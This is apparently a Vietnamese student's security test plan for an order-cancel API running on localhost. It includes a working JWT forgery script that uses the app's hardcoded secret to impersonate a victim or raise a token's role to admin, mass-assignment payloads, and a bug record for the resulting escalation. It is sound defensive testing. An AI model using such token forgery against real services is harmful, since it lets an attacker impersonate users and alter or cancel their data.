# API-2 — Nhóm test **Bảo mật** (SEC-02 auth · JWT forge · IDOR · mass-assign)

**API:** API-2 · **Endpoint:** `PUT /api/orders/:id/cancel`
**Kỹ thuật:** Security testing bám SEC-02/03/06 + khai thác JWT (secret lộ), IDOR, mass assignment
**Ngày lập:** 22/08/2026 · **Đã probe live trên `localhost:3000`, forge token thật, backup/restore DB**

> TC-ID nối tiếp: nhóm này **TC-O2-025 → 037**. Một số case auth cơ bản đã có ở nhóm phân hoạch
> (TC-O2-010/011/012); nhóm này đi sâu vào **forge token** và **escalation**.

---

## 0. Lỗ hổng nền (đọc source)

`backend/server.js:9` — **secret JWT hardcode** trong mã nguồn:
```js
const SECRET_KEY = "super_secret_key_that_should_not_be_here";
```
`server.js:100-110` — middleware `authenticateToken`:
```js
const token = authHeader && authHeader.split(" ")[1];
if (token == null) return res.status(401).json({ error: "Unauthorized" });
jwt.verify(token, SECRET_KEY, (err, user) => {
  if (err) return res.status(403).json({ error: "Forbidden" });
  req.user = user; next();
});
```
- Token khi login **không** có `exp` (`jwt.sign({id,role}, SECRET_KEY)` — `server.js:63`) ⇒ để test "token hết hạn"
  phải **tự sign** token có `exp` quá khứ.
- Vì secret lộ, **bất kỳ ai** cũng sign được token với `id`/`role` tùy ý ⇒ mạo danh + nâng quyền.

### Cách tạo forged token (ghi rõ để tái lập)

Chạy trong thư mục `backend/` (nơi có `node_modules/jsonwebtoken`):
```js
// forge.js
const jwt = require('jsonwebtoken');
const SECRET = "super_secret_key_that_should_not_be_here";       // lộ ở server.js:9
// (a) tự nâng role của chính mình:
console.log(jwt.sign({ id: 2, role: "admin" }, SECRET));
// (b) MẠO DANH nạn nhân (admin id=1) để hủy đơn của họ:
console.log(jwt.sign({ id: 1, role: "user" }, SECRET));
// (c) token HẾT HẠN để test SEC-02:
console.log(jwt.sign({ id: 2, role: "user" }, SECRET, { expiresIn: "-1h" }));
```
```bash
node forge.js   # copy chuỗi JWT in ra, dùng làm Authorization: Bearer <...>
```

---

## PRE — Tiền đề

| Mã | Nội dung |
|----|----------|
| **PRE-U / PRE-A** | Login user(id=2) → `{{userToken}}`; login admin(id=1) → `{{adminToken}}`. |
| **PRE-AO** | `POST /api/checkout` bằng `{{adminToken}}` → đơn `pending` **của admin(1)** → `{{adminOrderId}}` (dùng làm mục tiêu escalation). |
| **PRE-FORGE** | Sinh 3 forged token theo script trên: `{{forgedVictim}}` = `{id:1}`, `{{forgedAdminRole}}` = `{id:2,role:admin}`, `{{expiredToken}}` = `{id:2}` exp quá khứ. |

Header chung: `X-Student-Id: 23127438`.

---

## 1. Test cases

### 1.1 SEC-02 — biến thể xác thực

| TC-ID | API | FR/SEC | Technique | Precondition | Method + URL | Headers | Body | Expected status | Expected body / **assertion** | Priority |
|-------|-----|--------|-----------|--------------|--------------|---------|------|-----------------|-------------------------------|----------|
| TC-O2-025 | API-2 | **SEC-02** | Không token | PRE-AO | `PUT /api/orders/{{adminOrderId}}/cancel` | *(không Authorization)* | — | `401` | `{"error":"Unauthorized"}` | **P0** |
| TC-O2-026 | API-2 | **SEC-02** | Header `Authorization` rỗng | PRE-AO | `PUT .../cancel` | `Authorization:` (rỗng) | — | `401`/`403` | Bị từ chối, không thực thi | P1 |
| TC-O2-027 | API-2 | **SEC-02** | `Bearer ` (trống sau Bearer) | PRE-AO | `PUT .../cancel` | `Authorization: Bearer ` | — | `401` | Sau `split(" ")`, token rỗng/undefined ⇒ `Unauthorized` | P1 |
| TC-O2-028 | API-2 | **SEC-02** | Token rác | PRE-AO | `PUT .../cancel` | `Authorization: Bearer garbage.token.xx` | — | `403` | `{"error":"Forbidden"}` (jwt.verify fail) | P1 |
| TC-O2-029 | API-2 | **SEC-02** | Thiếu prefix `Bearer` | PRE-AO | `PUT .../cancel` | `Authorization: {{userToken}}` | — | `401` | `split(" ")[1]` undefined ⇒ token null ⇒ `Unauthorized` | P2 |
| TC-O2-030 | API-2 | **SEC-02** | Token sign bằng **secret sai** | PRE-AO | `PUT .../cancel` | `Authorization: Bearer {{wrongSecretToken}}` | — | `403` | Chữ ký không khớp ⇒ `Forbidden`. Khẳng định server **có** verify chữ ký | **P0** |
| TC-O2-031 | API-2 | **SEC-02** | Token **HẾT HẠN** (exp quá khứ) | PRE-FORGE `{{expiredToken}}` | `PUT .../cancel` | `Authorization: Bearer {{expiredToken}}` | — | `403` | `TokenExpiredError` ⇒ `Forbidden`. **Lưu ý:** phải tự sign vì token thật của SUT không có `exp` | P1 |

### 1.2 JWT Forge — privilege escalation (secret lộ)

| TC-ID | API | FR/SEC | Technique | Precondition | Method + URL | Headers | Body | Expected status | Expected body / **assertion** | Priority |
|-------|-----|--------|-----------|--------------|--------------|---------|------|-----------------|-------------------------------|----------|
| TC-O2-032 | API-2 | **SEC-02/03** | **FORGE mạo danh nạn nhân** — hủy đơn người khác | PRE-AO (đơn admin) + `{{forgedVictim}}` = `sign({id:1}, leakedSecret)` | `PUT /api/orders/{{adminOrderId}}/cancel` | `Authorization: Bearer {{forgedVictim}}` | — | Theo contract: `403` (secret phải nằm ngoài source; token giả phải bị từ chối) | **Assertion escalation:** SUT chấp nhận token giả và hủy đơn của admin(1) ⇒ `200` ⇒ **FAIL nghiêm trọng**. Đối chứng: cùng đơn này, token user thật (id=2) chỉ được `404` (TC-O2-002). Kẻ tấn công forge `id` bất kỳ ⇒ hủy đơn của **mọi** user | **P0** |
| TC-O2-033 | API-2 | **SEC-03** | **FORGE nâng role** — `{id:2, role:"admin"}` | `{{forgedAdminRole}}` + đơn của user(2) `{{ownOrderId}}` | `PUT /api/orders/{{ownOrderId}}/cancel` | `Authorization: Bearer {{forgedAdminRole}}` | — | `403` (token giả) | Token ký bằng secret lộ ⇒ verify PASS ⇒ `200`. **Nhận xét chính xác:** với *endpoint cancel* thì `role` không thêm quyền (cancel match theo `id`), nhưng case này **chứng minh secret bị lộ** và role có thể bị nâng — nguy hiểm thực sự khi token này dùng cho `/api/admin/*` (SEC-03) | **P0** |
| TC-O2-034 | API-2 | SEC-02 | Toàn vẹn: đơn nạn nhân sau forge | Sau TC-O2-032 | `GET /api/orders/{{adminOrderId}}` | — | — | Theo spec: đơn **không** bị đổi | **Assertion hậu quả:** nếu TC-032 trả `200`, đơn admin chuyển `canceled` ⇒ chứng minh escalation gây thiệt hại dữ liệu, không chỉ là "được gọi API" | P1 |

### 1.3 IDOR (không forge) — trade-off anti-enumeration

| TC-ID | API | FR/SEC | Technique | Precondition | Method + URL | Headers | Body | Expected status | Expected body / **assertion** | Priority |
|-------|-----|--------|-----------|--------------|--------------|---------|------|-----------------|-------------------------------|----------|
| TC-O2-035 | API-2 | **SEC-02** | IDOR: user(2) hủy đơn admin(1) | PRE-AO | `PUT /api/orders/{{adminOrderId}}/cancel` | `Authorization: Bearer {{userToken}}` | — | `404` | `{"error":"Order not found"}`. **Nhận xét trade-off:** SUT trả **`404`** (không phải `403`) — che giấu sự tồn tại của đơn (anti-enumeration, **tốt** cho bảo mật) nhưng client không phân biệt được "đơn không có" vs "đơn không phải của bạn" (mơ hồ về UX/debug). Với endpoint hủy đơn, **404 là lựa chọn đúng**: không nên tiết lộ đơn của người khác có tồn tại | **P0** |

### 1.4 Mass assignment

| TC-ID | API | FR/SEC | Technique | Precondition | Method + URL | Headers | Body | Expected status | Expected body / **assertion** | Priority |
|-------|-----|--------|-----------|--------------|--------------|---------|------|-----------------|-------------------------------|----------|
| TC-O2-036 | API-2 | **SEC-06** | Mass-assign `status` qua body | đơn `pending` của user → `{{ownOrderId2}}` | `PUT /api/orders/{{ownOrderId2}}/cancel` | `Bearer {{userToken}}` | `{"status":"delivered"}` | `200` | Endpoint **bỏ qua** body. Hậu kiểm: `status === "canceled"` (KHÔNG phải `"delivered"`). Client không set được state tùy ý ⇒ **PASS** | P1 |
| TC-O2-037 | API-2 | **SEC-06** | Mass-assign field lạ | đơn `pending` của user → `{{ownOrderId3}}` | `PUT /api/orders/{{ownOrderId3}}/cancel` | `Bearer {{userToken}}` | `{"user_id":1,"total_amount":0,"id":999}` | `200` | Body bị bỏ qua; `user_id`/`total_amount` của đơn không đổi. Hậu kiểm bằng `GET` | P2 |

**Tổng nhóm bảo mật API-2: 13 test case** (TC-O2-025 → 037).
**API-2 tổng cộng: 15 (phân hoạch) + 9 (state) + 13 (security) = 37 test case** (TC-O2-001 → 037) — đạt mốc ≥35/API.

---

## Phụ lục — Hành vi SUT đã probe & verdict

> Đã forge token thật bằng `jsonwebtoken` + secret lộ; tạo đơn của admin(1) làm mục tiêu; DB backup/restore.

| TC-ID | Input | Expected (contract) | **Actual (SUT)** | Verdict | Bug |
|-------|-------|---------------------|------------------|---------|-----|
| 025 | không token | `401` | `401` `{"error":"Unauthorized"}` | ✅ PASS | — |
| 026 | Authorization rỗng | `401`/`403` | `403` `{"error":"Forbidden"}` | ✅ PASS | — |
| 027 | `Bearer ` trống | `401` | `401` `{"error":"Unauthorized"}` | ✅ PASS | — |
| 028 | token rác | `403` | `403` `{"error":"Forbidden"}` | ✅ PASS | — |
| 029 | thiếu prefix Bearer | `401` | `401` `{"error":"Unauthorized"}` | ✅ PASS | — |
| 030 | sign secret sai | `403` | `403` `{"error":"Forbidden"}` | ✅ PASS | — |
| 031 | token hết hạn | `403` | `403` `{"error":"Forbidden"}` | ✅ PASS | — |
| **032** | **forge {id:1} hủy đơn admin(1)** | `403` (từ chối token giả) | **`200`** `{"message":"Order canceled successfully"}` — hủy được đơn nạn nhân | ❌ **FAIL nghiêm trọng** | **BUG-13** |
| **033** | **forge {id:2,role:admin}** | `403` | **`200`** (verify PASS vì chữ ký hợp lệ) | ❌ **FAIL** | **BUG-13** |
| **034** | đơn admin sau forge | không đổi | chuyển `canceled` (thiệt hại dữ liệu) | ❌ **FAIL** | **BUG-13** |
| 035 | IDOR user→đơn admin | `404` (anti-enum) | `404` `{"error":"Order not found"}` | ✅ PASS | — |
| 036 | body `{status:delivered}` | bỏ qua, `canceled` | `200`; `status="canceled"` | ✅ PASS | — |
| 037 | body field lạ | bỏ qua | `200`; đơn không đổi field lạ | ✅ PASS | — |

**Kết luận:** 13 case → **10 PASS / 3 FAIL**, cả 3 FAIL đều là **BUG-13** (secret JWT hardcode).
- **SEC-02 auth: PASS toàn bộ** — server verify chữ ký đúng, từ chối token rác/sai secret/hết hạn/thiếu.
- **BUG-13 (forge): FAIL nghiêm trọng** — vì secret lộ, forge `id` bất kỳ ⇒ hủy đơn của **mọi** user (TC-032/034), và nâng `role` tùy ý (TC-033). Đây là escalation thật, gây thiệt hại dữ liệu.
- **IDOR & mass-assign: PASS** — ownership dùng `404` (anti-enumeration đúng), body bị bỏ qua (không mass-assign).

### BUG-13 — hồ sơ

| Trường | Nội dung |
|--------|----------|
| **Severity / Priority** | **Critical / P0** |
| **SEC** | SEC-02 (JWT integrity) + SEC-03 (role không được tin từ token giả) |
| **Root cause** | `server.js:9` secret hardcode trong source (repo public) ⇒ ai đọc code cũng forge được token. Token cũng không có `exp` (`server.js:63`) ⇒ không tự hết hạn. |
| **Exploit** | `jwt.sign({id: <victim>}, "super_secret_key_that_should_not_be_here")` → `Authorization: Bearer <forged>` → hủy đơn của victim (TC-032) hoặc nâng role admin cho `/api/admin/*` (TC-033). |
| **Fix gợi ý** | Đưa secret ra biến môi trường (không commit); rotate secret; thêm `expiresIn` khi sign; cân nhắc kiểm tra `role` từ DB thay vì tin token. |

> **Nhận xét chính xác (tránh phóng đại):** riêng với *endpoint cancel*, forge **`role`** không thêm quyền vì
> cancel match theo `id`; thứ tạo ra escalation ở đây là forge **`id`** của nạn nhân (TC-032). Case forge role
> (TC-033) vẫn quan trọng vì nó chứng minh secret bị lộ — hệ quả nặng nhất là khi token đó dùng cho nhóm
> `/api/admin/*` (kiểm ở API-3 / phần admin).
